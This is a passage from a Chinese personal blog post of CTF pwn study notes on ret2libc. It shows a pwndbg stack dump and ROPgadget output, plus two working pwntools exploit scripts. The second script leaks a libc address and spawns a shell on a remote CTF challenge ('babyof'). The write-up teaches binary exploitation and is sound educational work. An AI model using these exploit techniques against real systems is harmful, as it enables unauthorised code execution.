+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 40</span><br><span class="line">00:0000│ esp 0xffffd300 —▸ 0xffffd31c ◂— <span class="string">&#x27;AAAAAAAA&#x27;</span></span><br><span class="line">01:0004│-084 0xffffd304 ◂— 0x0</span><br><span class="line">02:0008│-080 0xffffd308 ◂— 0x1</span><br><span class="line">03:000c│-07c 0xffffd30c ◂— 0x0</span><br><span class="line">04:0010│-078 0xffffd310 —▸ 0xf7ffdb9c —▸ 0xf7fc26f0 —▸ 0xf7ffda30 ◂— 0x0</span><br><span class="line">05:0014│-074 0xffffd314 ◂— 0x1</span><br><span class="line">06:0018│-070 0xffffd318 —▸ 0xf7fc2720 —▸ 0x8048354 ◂— inc edi /* <span class="string">&#x27;GLIBC_2.0&#x27;</span> */</span><br><span class="line">07:001c│ eax 0xffffd31c ◂— <span class="string">&#x27;AAAAAAAA&#x27;</span></span><br><span class="line">08:0020│-068 0xffffd320 ◂— <span class="string">&#x27;AAAA&#x27;</span></span><br><span class="line">09:0024│-064 0xffffd324 ◂— 0x0</span><br><span class="line">0a:0028│-060 0xffffd328 —▸ 0xf7ffda30 ◂— 0x0</span><br><span class="line">0b:002c│-05c 0xffffd32c ◂— 0x1c</span><br><span class="line">0c:0030│-058 0xffffd330 ◂— 0xffffffff</span><br><span class="line">0d:0034│-054 0xffffd334 —▸ 0xf7fca67c ◂— 0xe</span><br><span class="line">0e:0038│-050 0xffffd338 —▸ 0xf7ffd5e8 (_rtld_global+1512) —▸ 0xf7fca000 ◂— 0x464c457f</span><br><span class="line">0f:003c│-04c 0xffffd33c —▸ 0xffffdfe2 ◂— <span class="string">&#x27;/mnt/shared/ret2libc2&#x27;</span></span><br><span class="line">10:0040│-048 0xffffd340 —▸ 0xf7ffcff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x32f34</span><br><span class="line">11:0044│-044 0xffffd344 ◂— 0xc /* <span class="string">&#x27;\x0c&#x27;</span> */</span><br><span class="line">12:0048│-040 0xffffd348 ◂— 0x0</span><br><span class="line">... ↓        3 skipped</span><br><span class="line">16:0058│-030 0xffffd358 ◂— 0x13</span><br><span class="line">17:005c│-02c 0xffffd35c —▸ 0xf7fc2400 —▸ 0xf7c00000 ◂— 0x464c457f</span><br><span class="line">18:0060│-028 0xffffd360 —▸ 0xf7c216ac ◂— 0x21e04c</span><br><span class="line">19:0064│-024 0xffffd364 —▸ 0xf7fd9d41 (_dl_fixup+225) ◂— mov dword ptr [esp + 0x28], eax                                                                  </span><br><span class="line">1a:0068│-020 0xffffd368 —▸ 0xf7c1c9a2 ◂— <span class="string">&#x27;_dl_audit_preinit&#x27;</span></span><br><span class="line">1b:006c│-01c 0xffffd36c —▸ 0xf7fc2400 —▸ 0xf7c00000 ◂— 0x464c457f</span><br><span class="line">1c:0070│-018 0xffffd370 —▸ 0xffffd3a0 —▸ 0xf7e1dff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21dd8c</span><br><span class="line">1d:0074│-014 0xffffd374 —▸ 0xf7fc25d8 —▸ 0xf7ffdb9c —▸ 0xf7fc26f0 —▸ 0xf7ffda30 ◂— ...                                                                    </span><br><span class="line">1e:0078│-010 0xffffd378 —▸ 0xf7fc2ab0 —▸ 0xf7c1f22d ◂— <span class="string">&#x27;GLIBC_PRIVATE&#x27;</span></span><br><span class="line">1f:007c│-00c 0xffffd37c ◂— 0x1</span><br><span class="line">20:0080│-008 0xffffd380 ◂— 0x1</span><br><span class="line">21:0084│-004 0xffffd384 ◂— 0x0</span><br><span class="line">22:0088│ ebp 0xffffd388 ◂— 0x0</span><br><span class="line">23:008c│+004 0xffffd38c —▸ 0xf7c237c5 (__libc_start_call_main+117) ◂— add esp, 0x10                                                                       </span><br><span class="line">24:0090│+008 0xffffd390 ◂— 0x1</span><br><span class="line">25:0094│+00c 0xffffd394 —▸ 0xffffd444 —▸ 0xffffd5c2 ◂— <span class="string">&#x27;/mnt/shared/ret2libc2&#x27;</span></span><br><span class="line">26:0098│+010 0xffffd398 —▸ 0xffffd44c —▸ 0xffffd5d8 ◂— <span class="string">&#x27;COLORTERM=truecolor&#x27;</span></span><br><span class="line">27:009c│+014 0xffffd39c —▸ 0xffffd3b0 —▸ 0xf7e1dff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21dd8c</span><br><span class="line">pwndbg&gt; 0x388 -0x31c</span><br><span class="line">Undefined <span class="built_in">command</span>: <span class="string">&quot;0x388&quot;</span>.  Try <span class="string">&quot;help&quot;</span>.</span><br><span class="line">pwndbg&gt; <span class="built_in">print</span> 0x388 -0x31c</span><br><span class="line"><span class="variable">$1</span> = 108</span><br></pre></td></tr></table></figure>
+<p>​	基本上需要的信息全部都有了，那么就可以进行代码的编写了，基本上思路按照下图所示：</p>
+<p><img data-src="https://img-blog.csdnimg.cn/direct/aa290048a01543e7bcb197d704071cd2.png#pic_center" alt="在这里插入图片描述"></p>
+<p>​	这里的思路是无论后续的程序是否崩溃，都跟我们没关系，所以没有平衡栈，平衡栈的写法如下图：</p>
+<p><img data-src="https://img-blog.csdnimg.cn/direct/cb466c0487d04ffeae39492abda43194.png#pic_center" alt="在这里插入图片描述"></p>
+<p>​	因此，最后的 exp 为（没有平衡栈）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(&#x27;./ret2libc2&#x27;)</span><br><span class="line">gets_plt = 0x8048460</span><br><span class="line">sys_plt = 0x8048490</span><br><span class="line">buf2 = 0x0804A080</span><br><span class="line">payload = b&#x27;A&#x27;*112 + p32(gets_plt) + p32(sys_plt) + p32(buf2) + p32(buf2)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="3情况3"><a class="markdownIt-Anchor" href="#3情况3">#</a> 3. 情况 3：</h3>
+<h4 id="题目案例2021-鹤城杯babyof"><a class="markdownIt-Anchor" href="#题目案例2021-鹤城杯babyof">#</a> 题目案例：[2021 鹤城杯] babyof：</h4>
+<p>​	在做学习 CTF-Wiki–ret2libc3 的时候可我发现了一系列的问题，就比如说 LibcSearcher 查找本地运行的程序的 libc 版本总是出现查找的 10 个版本全部不匹配之类的情况，很让人头疼，并且也没有找到有效的解决方法，有点凭运气，<strong>这个问题先记录在这里</strong>，等到以后有机会了再重新编写这个问题。</p>
+<p>​	又因为之前都是做的关于 32 位程序的 ret2libc，所以这里又因为刚好碰到了本地运行的程序的 libc 版本找不到的情况，因此这里就换一个 64 的程序来做。</p>
+<p>​	首先，讲一下前置的知识，关于 64 位程序的函数的传参方式还有其他的一些前置内容。</p>
+<p>​	64 位程序与 32 位程序的函数传参方式是后一定的区别的，32 位程序的传参只用到了栈，而 64 位的程序的传参前六个参数分别用到了 rdi，rsi，rdx，rcx，r8，r9 这六个寄存器，之后才会用到栈。</p>
+<p>​	另外，对于 libc 的载入内存，动态链接库载入到内存中的起始地址是部分随机的，不过因为内存分页的概念，会发现每一次运行程序的时候，libc 的某一个函数的地址的后三位是不变的，也正因为 libc 载入内存的起始地址是随机在分页的起始地址，所以会发现每一次运行程序泄露到的函数地址的后三位是相同的，因此，LibcSearcher 模块以及其他的相对应的网站工具才能获得正确的 libc 的版本。</p>
+<p>​	好的，前置的知识差不多就这些了，之后遇到了再说，首先打开题目，第一时间看看保护：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@g01den-virtual-machine:/mnt/shared<span class="comment"># checksec babyof</span></span><br><span class="line">[*] <span class="string">&#x27;/mnt/shared/babyof&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+<p>​	可见，是 64 为小端序，开启了 NX 保护，之后静态调试看看，首先是 main，左边能找到，发现 main 里面调用了个函数，是以地址的形式，跟进这个函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_400632</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you know how to do buffer overflow?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;I hope you win&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>​	很不错，很明显，这个就是漏洞函数，那么，先用 cyclic 算一下偏移量，得到的是 72：</p>
+<p><img data-src="https://img-blog.csdnimg.cn/direct/b60c8d0628ed44e2bda0cff18649dcf3.png#pic_center" alt="在这里插入图片描述"></p>
+<p>​	之后，还需要 ret 和 pop rdi;ret 的 gadgets，所以用 ROPgadget 来查：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@g01den-virtual-machine:/mnt/shared<span class="comment"># ROPgadget --binary babyof --only &quot;pop|ret&quot;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x000000000040073c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040073e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400740 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400742 : pop r15 ; ret</span><br><span class="line">0x000000000040073b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040073f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400619 : pop rbp ; ret</span><br><span class="line">0x0000000000400743 : pop rdi ; ret</span><br><span class="line">0x0000000000400741 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x000000000040073d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400506 : ret</span><br><span class="line">0x0000000000400870 : ret 0xfffd</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 12</span><br></pre></td></tr></table></figure>
+<p>​	发现找到了，地址是 0x0000000000400506 和 0x0000000000400743，之后就是编写攻击脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>, <span class="number">28230</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./babyof&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#第一次调用puts函数，然后泄露puts函数的真实地址</span></span><br><span class="line">ret = <span class="number">0x400506</span></span><br><span class="line">pop_rdi = <span class="number">0x400743</span></span><br><span class="line">func_vuln_addr = <span class="number">0x400632</span></span><br><span class="line">payload = flat([cyclic(<span class="number">0x40</span> + <span class="number">0x08</span>), pop_rdi, elf.got[<span class="string">&#x27;puts&#x27;</span>], elf.plt[<span class="string">&#x27;puts&#x27;</span>], func_vuln_addr])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Do you know how to do buffer overflow?\n&quot;</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;win\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#接收了puts函数的真实地址，ljust之后对齐，再然后就是通过u64打包</span></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)    <span class="comment">#这个函数有两个参数，第一个参数是已经泄露了地址的函数，第二个参数是该函数的地址</span></span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>) <span class="comment">#使用dump函数得到相对于基地址的偏移地址，然后函数真实地址-偏移地址得到基地址</span></span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">str_bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = flat([cyclic(<span class="number">0x40</span> + <span class="number">0x08</span>), ret, pop_rdi, str_bin_sh, system_addr])</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Do you know how to do buffer overflow?\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>​	为啥第二个 payload 需要加上一个 ret 的地址，大佬的解释如下：</p>
+<p><img data-src="https://img-blog.csdnimg.cn/direct/bd744137c4ae4baab0a4b3f11265b4df.png#pic_center" alt="在这里插入图片描述"></p>
+<p>​	其实就是对于 Ubuntu18 或者更高的系统，需要完成 16 字节对齐，否则会直接终止程序。</p>
+<p>​	最后，运行脚本，在那 10 个版本中选择，直到拿到正确的为止。</p>
+
+      <div class="tags">
+          <a href="/tags/Pwn/" rel="tag"><i class="ic i-tag"></i> Pwn</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">更新于</span>
+    <time title="修改时间：2024-06-20 21:28:39" itemprop="dateModified" datetime="2024-06-20T21:28:39+08:00">2024-06-20</time>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> 赞赏</button>
+  <p>请我喝[茶]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt="g01den 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt="g01den 支付宝">
+        <p>支付宝</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt="g01den 贝宝">
+        <p>贝宝</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>本文作者： </strong>g01den <i class="ic i-at"><em>@</em></i>golden的部落阁
+  </li>
+  <li class="link">
+    <strong>本文链接：</strong>
+    <a href="http://blog.g01den.top/posts/52965aaa.html" title="pwn学习笔记（4）ret2libc">http://blog.g01den.top/posts/52965aaa.html</a>
+  </li>
+  <li class="license">
+    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC96aC1DTg=="><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/posts/e20e7502.html" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;gitee.com&#x2F;gou-dengyue&#x2F;images&#x2F;raw&#x2F;master&#x2F;picture108.jpg" title="pwn学习笔记（3）ret2syscall">
+  <span class="type">上一篇</span>
+  <span class="category"><i class="ic i-flag"></i> Pwn手的自我修养</span>
+  <h3>pwn学习笔记（3）ret2syscall</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+      
+
+  <a href="/posts/384200ef.html" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;gitee.com&#x2F;gou-dengyue&#x2F;images&#x2F;raw&#x2F;master&#x2F;picture5.jpg" title="SQL无列名注入">
+  <span class="type">下一篇</span>
+  <span class="category"><i class="ic i-flag"></i> Web狗的自我安慰</span>
+  <h3>SQL无列名注入</h3>
+  </a>
+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="文章目录">
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B04"><span class="toc-number">1.</span> <span class="toc-text"> pwn 学习笔记（4）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5"><span class="toc-number">1.1.</span> <span class="toc-text"> 静态链接：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5"><span class="toc-number">1.2.</span> <span class="toc-text"> 动态链接：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E7%AE%80%E8%BF%B0"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 1. 简述：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E8%BF%87%E7%A8%8B"><span class="toc-number">1.2.2.</span> <span class="toc-text"> 2. 过程：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%B0%83%E7%94%A8%E4%BB%A5printf%E4%B8%BE%E4%BE%8B"><span class="toc-number">1.2.2.1.</span> <span class="toc-text"> 第一次调用（以 printf () 举例）：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AC%A1%E8%B0%83%E7%94%A8"><span class="toc-number">1.2.2.2.</span> <span class="toc-text"> 第二次调用：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%85%E8%B0%88%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E4%B8%AD%E7%9A%84%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92"><span class="toc-number">1.3.</span> <span class="toc-text"> 浅谈函数调用中的参数传递：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2libc"><span class="toc-number">1.4.</span> <span class="toc-text"> ret2libc：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E6%83%85%E5%86%B51"><span class="toc-number">1.4.1.</span> <span class="toc-text"> 1. 情况 1：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%A1%88%E4%BE%8Bctf-wikiret2libc1"><span class="toc-number">1.4.1.1.</span> <span class="toc-text"> 题目案例：CTF-Wiki–ret2libc1：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E6%83%85%E5%86%B52"><span class="toc-number">1.4.2.</span> <span class="toc-text"> 2. 情况 2：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%A1%88%E4%BE%8Bctf-wikiret2libc2"><span class="toc-number">1.4.2.1.</span> <span class="toc-text"> 题目案例：CTF-Wiki–ret2libc2：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E6%83%85%E5%86%B53"><span class="toc-number">1.4.3.</span> <span class="toc-text"> 3. 情况 3：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%A1%88%E4%BE%8B2021-%E9%B9%A4%E5%9F%8E%E6%9D%AFbabyof"><span class="toc-number">1.4.3.1.</span> <span class="toc-text"> 题目案例：[2021 鹤城杯] babyof：</span></a></li></ol></li></ol></li></ol></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="系列文章">
+        <ul>
+          <li><a href="/posts/c06afb6e.html" rel="bookmark" title="Pwn学习笔记（1）--前置知识">Pwn学习笔记（1）--前置知识</a></li><li><a href="/posts/c3c1bd42.html" rel="bookmark" title="Pwn学习笔记（2）--ret_2_text_or_shellcode">Pwn学习笔记（2）--ret_2_text_or_shellcode</a></li><li><a href="/posts/e20e7502.html" rel="bookmark" title="pwn学习笔记（3）ret2syscall">pwn学习笔记（3）ret2syscall</a></li><li class="active"><a href="/posts/52965aaa.html" rel="bookmark" title="pwn学习笔记（4）ret2libc">pwn学习笔记（4）ret2libc</a></li><li><a href="/posts/a698ff8.html" rel="bookmark" title="pwn学习笔记（5）--格式化字符串漏洞（未完全完成）">pwn学习笔记（5）--格式化字符串漏洞（未完全完成）</a></li><li><a href="/posts/cbafa55d.html" rel="bookmark" title="pwn学习笔记（6）--堆基础概述">pwn学习笔记（6）--堆基础概述</a></li><li><a href="/posts/efb4c08.html" rel="bookmark" title="pwn学习笔记（7）--堆相关源码">pwn学习笔记（7）--堆相关源码</a></li><li><a href="/posts/d7e2e20f.html" rel="bookmark" title="pwn学习笔记（0）-事后补充">pwn学习笔记（0）-事后补充</a></li><li><a href="/posts/9b0d93f7.html" rel="bookmark" title="Pwn刷题记录（不停更新）">Pwn刷题记录（不停更新）</a></li><li><a href="/posts/2c0210e1.html" rel="bookmark" title="how2heap_zh">how2heap_zh</a></li><li><a href="/posts/9d5b1ce4.html" rel="bookmark" title="pwn学习笔记（8）-初识沙箱">pwn学习笔记（8）-初识沙箱</a></li><li><a href="/posts/c8624158.html" rel="bookmark" title="pwn学习笔记（9）-中级ROP--ret2csu">pwn学习笔记（9）-中级ROP--ret2csu</a></li><li><a href="/posts/540e5c20.html" rel="bookmark" title="Pwn学习笔记（10）--UAF">Pwn学习笔记（10）--UAF</a></li><li><a href="/posts/f1497b96.html" rel="bookmark" title="pwn学习笔记（11）--off_by_one">pwn学习笔记（11）--off_by_one</a></li><li><a href="/posts/d1a08bca.html" rel="bookmark" title="pwn学习笔记（12）--Chunk Extend and Overlapping">pwn学习笔记（12）--Chunk Extend and Overlapping</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="站点概览">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="g01den"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">g01den</p>
+  <div class="description" itemprop="description">golden的部落阁</div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">49</span>
+        <span class="name">文章</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">10</span>
+        <span class="name">分类</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">8</span>
+        <span class="name">标签</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL2cwMWRlbjE=" title="https:&#x2F;&#x2F;github.com&#x2F;g01den1"><i class="ic i-github"></i></span>
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
+  </li>
+
+        
+  <li class="item dropdown">
+      <a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a>
+    <ul class="submenu">
+
+        
+  <li class="item">
+    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
+  </li>
+
+  </ul>
+    
+  <li class="item">
+    <a href="/links/" rel="section"><i class="ic i-magic"></i>links</a>
+  </li>
+
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+        <a href="/posts/e20e7502.html" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+        <a href="/posts/384200ef.html" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>随机文章</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
+</div>
+
+    <span><a href="/posts/53e2b2e1.html" title="ctfshow-命令执行">ctfshow-命令执行</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
+</div>
+
+    <span><a href="/posts/efb4c08.html" title="pwn学习笔记（7）--堆相关源码">pwn学习笔记（7）--堆相关源码</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
+</div>
+
+    <span><a href="/posts/4826d2ce.html" title="ctfshow-SSTI">ctfshow-SSTI</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Daily/" title="分类于 发电日常">发电日常</a>
+</div>
+
+    <span><a href="/posts/ef2fddc9.html" title="arcaea闲谈">arcaea闲谈</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Daily/" title="分类于 发电日常">发电日常</a>
+</div>
+
+    <span><a href="/posts/cf99ed43.html" title="从NSSCTF开始的复建之路">从NSSCTF开始的复建之路</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
+</div>
+
+    <span><a href="/posts/97a7dff3.html" title="ctfshow-信息搜集">ctfshow-信息搜集</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Misc/" title="分类于 杂七杂八的知识点">杂七杂八的知识点</a>
+</div>
+
+    <span><a href="/posts/d63a55bd.html" title="BUUCTF-Misc-第一页(1-16)">BUUCTF-Misc-第一页(1-16)</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Game/" title="分类于 CTFer的比赛之路">CTFer的比赛之路</a>
+</div>
+
+    <span><a href="/posts/de34fe7b.html" title="【2024】HECTF-个人整理向">【2024】HECTF-个人整理向</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
+</div>
+
+    <span><a href="/posts/ff5b88d5.html" title="python原型链污染">python原型链污染</a></span>
